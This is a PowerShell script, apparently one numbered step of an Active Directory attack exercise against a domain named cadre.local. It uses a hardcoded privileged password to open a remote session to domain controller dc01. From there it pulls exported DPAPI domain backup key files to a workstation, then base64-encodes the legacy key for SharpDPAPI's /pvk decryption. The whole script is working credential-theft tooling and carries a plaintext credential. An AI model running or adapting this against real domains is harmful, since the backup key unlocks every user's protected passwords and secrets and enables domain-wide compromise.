# 3.5G step1d: pull all exported DPAPI backup key files from dc01 to ws01
$ErrorActionPreference = 'Continue'
$cred = New-Object System.Management.Automation.PSCredential('cadre.local\chief_command', (ConvertTo-SecureString 'C0mm@nd_Ch1ef!' -AsPlainText -Force))
try {
    $s = New-PSSession -ComputerName 'dc01.cadre.local' -Credential $cred -ErrorAction Stop
    $files = Invoke-Command -Session $s -ScriptBlock {
        Get-ChildItem C:\Windows\Temp\ntds_capi_0_* -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
        Get-ChildItem C:\Windows\Temp\ntds_legacy_0_* -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
    }
    foreach ($f in $files) {
        $dest = 'C:\Tools\ADTools\' + (Split-Path $f -Leaf)
        Copy-Item -FromSession $s -Path $f -Destination $dest -Force
        Write-Output "PULLED|$f -> $dest ($((Get-Item $dest).Length) bytes)"
    }
    Remove-PSSession $s
} catch { Write-Output "ERR|$($_.Exception.Message)" }

# build base64 of the legacy key for SharpDPAPI /pvk:<b64>
$legacy = Get-ChildItem 'C:\Tools\ADTools\ntds_legacy_0_*.key' -ErrorAction SilentlyContinue | Select-Object -First 1
if ($legacy) {
    $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($legacy.FullName))
    Write-Output "LEGACY_B64_LEN $($b64.Length)"
    $b64 | Set-Content 'C:\Tools\ADTools\wt035g-legacy-b64.txt'
}
# also der
$der = Get-ChildItem 'C:\Tools\ADTools\ntds_capi_0_*.der' -ErrorAction SilentlyContinue | Select-Object -First 1
if ($der) {
    $b64d = [Convert]::ToBase64String([IO.File]::ReadAllBytes($der.FullName))
    Write-Output "DER_B64_LEN $($b64d.Length)"
    $b64d | Set-Content 'C:\Tools\ADTools\wt035g-der-b64.txt'
}
Write-Output '3.5G_STEP1D_DONE'
